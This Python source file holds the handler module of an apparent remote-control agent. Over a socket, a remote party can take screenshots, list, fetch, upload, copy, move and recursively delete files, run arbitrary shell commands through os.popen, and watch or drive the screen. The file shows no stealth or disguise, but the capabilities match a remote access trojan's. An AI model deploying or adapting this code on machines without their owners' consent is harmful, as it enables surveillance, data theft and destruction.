import math
import mss
import random
import string
import pathlib
from enum import Enum
import os
from utils import Connection, Events, NetworkUtils, Event
import socket
import pickle
import shutil
from constants import Error, Options
import pyautogui
from screen_control import ScreenControl
import win32api
import struct
from terminal import Terminal

pyautogui.PAUSE = 0

def send_event(conn: Connection, action: Events, data: list):
    conn.send([action.value, *data])

def generate_random_file_name(ext):
    length = 6
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
    return name + "." + ext

def nukedir(dir):
    if dir[-1] == os.sep: dir = dir[:-1]
    files = os.listdir(dir)
    for file in files:
        if file == '.' or file == '..': continue
        path = dir + os.sep + file
        if os.path.isdir(path):
            nukedir(path)
        else:
            os.unlink(path)
    os.rmdir(dir)

class ScreenshotRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received screenshot request event")

        if not os.path.exists("screenshots/"):
            os.mkdir(Options.SCREENSHOTS_FOLDER)

        with mss.mss(with_cursor=True) as sct:
            fn = generate_random_file_name("png")
            path = os.path.join(Options.SCREENSHOTS_FOLDER, fn)
            sct.shot(output=path)
            abs_path = str(pathlib.Path(path).resolve())

            conn.send_event(Events.ScreenshotDone_Response, [abs_path])
            conn.send_success(f"[{Events.Screenshot_Request.name}] Screenshot saved to {abs_path}")

class FileRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received file request event")

        transaction_id = data[0]
        path_b = data[1]
        path_str = path_b.decode()
        path = None
        abs_path = None
        
        try:
            path = pathlib.Path(path_str)
            abs_path = str(path.resolve())
        except Exception:
            conn.send_failure(Error.BadPath, f"[{Events.FileContent_Request.name}] Bad path: {path_str}", [Events.FileContent_Request.value, transaction_id])
            return
        
        if not path.exists():
            conn.send_failure(Error.FileNotFound, f"[{Events.FileContent_Request.name}] File not found: {abs_path}", [Events.FileContent_Request.value, transaction_id])
            return
        
        fsize_bytes = os.path.getsize(abs_path)
        chunks_num = math.ceil(fsize_bytes / Options.CHUNK_SIZE)
        if chunks_num == 0: return
        with open(abs_path, 'rb') as f:
            for i in range(chunks_num):
                file_d = f.read(Options.CHUNK_SIZE)
                if file_d:
                    conn.send_event(Events.FileChunkDownload_Response, [transaction_id, i+1, chunks_num, file_d])
                Terminal.debug(f"Sent chunk {i+1}/{chunks_num} of {abs_path} | TID: {transaction_id}")
        
        conn.send_success(f"[{Events.FileContent_Request.name}] File sent: {abs_path} | TID: {transaction_id}")        

class FileListRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received file list request event")

        try:
            relative = data[0].decode()
            files = [str(f) for f in pathlib.Path(relative).iterdir()]
            serialized = pickle.dumps(files)
            conn.send_event(Events.FileList_Response, [serialized])
            conn.send_success(f"[{Events.FileList_Request.name}] Sent file list of {relative} ({len(files)} items)")
        except FileNotFoundError:
            conn.send_failure(Error.BadPath, f"[{Events.FileList_Request.name}] Bad path: {relative}")

class FileCopyRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received file copy request event")

        try:
            pathA = pathlib.Path(data[0].decode())
            pathB = pathlib.Path(data[1].decode())
            shutil.copyfile(pathA.resolve(), pathB.resolve())
            conn.send_success(f"[{Events.CopyFile_Request.name}] Copied {pathA} to {pathB}")

        except FileNotFoundError:
            conn.send_failure(Error.BadPath, f"[{Events.CopyFile_Request.name}] Bad path: {pathA} / {pathB}")

class FileMoveRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received file move request event")

        try:
            pathA = pathlib.Path(data[0].decode())
            pathB = pathlib.Path(data[1].decode())
            shutil.move(pathA.resolve(), pathB.resolve())
            conn.send_success(f"[{Events.MoveFile_Request.name}] Moved {pathA} to {pathB}")
        except FileNotFoundError:
            conn.send_failure(Error.BadPath, f"[{Events.MoveFile_Request.name}] Bad path: {pathA} / {pathB}")            

class FileChunkUploadEvent(Event):
    name_to_chunk_count: dict[str, int] = {}

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        parts = data[0].split(Options.SEPERATOR, 2)
        out_file: str = parts[0].decode()
        total_chunks = int.from_bytes(parts[1])
        chunk: bytes = parts[2]

        Terminal.debug(f"Received chunk {FileChunkUploadEvent.name_to_chunk_count.get(out_file, 0) + 1}/{total_chunks} of {out_file}")

        with open(out_file, 'ab') as f:
            f.write(chunk)

        FileChunkUploadEvent.name_to_chunk_count[out_file] = FileChunkUploadEvent.name_to_chunk_count.get(out_file, 0) + 1
        if FileChunkUploadEvent.name_to_chunk_count[out_file] == total_chunks:
            conn.send_success(f"[{Events.FileChunkUpload_Action.name}] Downloaded file: {out_file} | {total_chunks} chunks")
            del FileChunkUploadEvent.name_to_chunk_count[out_file]

class CommandRunRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received command run request event")

        command = data[0].decode()
        out = os.popen(command).read()
        conn.send_event(Events.CommandRun_Response, [out])
        conn.send_success(f"[{Events.CommandRun_Request.name}] Ran command: {command}")

class FileRemoveEventRequest(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        try:
            path = str(pathlib.Path(data[0].decode()).absolute().resolve())
            if os.path.isfile(path):
                os.unlink(path)
            else:
                nukedir(path)

            conn.send_success(f"[{Events.RemoveFile_Request.name}] Removed {path}")
        except FileNotFoundError:
            conn.send_failure(Error.BadPath, f"[{Events.RemoveFile_Request.name}] Bad path: {path}")

class ScreenControlRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received screen control request event")

        screen_width = int(win32api.GetSystemMetrics(0) * Options.SCREEN_SIZE_FACTOR)
        screen_height = int(win32api.GetSystemMetrics(1) * Options.SCREEN_SIZE_FACTOR)
        conn.send_event(Events.AcceptScreenControl_Response, [
            struct.pack('I', screen_width),
            struct.pack('I', screen_height),
        ])

        Terminal.success("Screen control started")
        ScreenControl.allow_control = True
        ScreenControl.accepting_sc = True
        ScreenControl.start()

class ScreenControlDisconnectEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received screen control disconnect event")
        Terminal.success("Screen control stopped")
        ScreenControl.accepting_sc = False

class ScreenWatchRequestEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.debug("Received screen watch request event")
        screen_width = int(win32api.GetSystemMetrics(0) * Options.SCREEN_SIZE_FACTOR)
        screen_height = int(win32api.GetSystemMetrics(1) * Options.SCREEN_SIZE_FACTOR)

        conn.send_event(Events.AcceptScreenWatch_Response, [
            struct.pack('I', screen_width),
            struct.pack('I', screen_height),
        ])

        Terminal.success("Screen watch started")
        ScreenControl.accepting_sc = True
        ScreenControl.allow_control = False
        ScreenControl.start()

class UnknownEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        Terminal.warning(f"Received unknown event: {data}")

class ConnectionClosedEvent(Event):

    @staticmethod
    def handle(data: list[bytes], conn: Connection):
        NetworkUtils.remove_event_listener(conn)
        Terminal.warning("Client disconnected from server: " + conn.socket.getpeername()[0])
        conn.disconnect()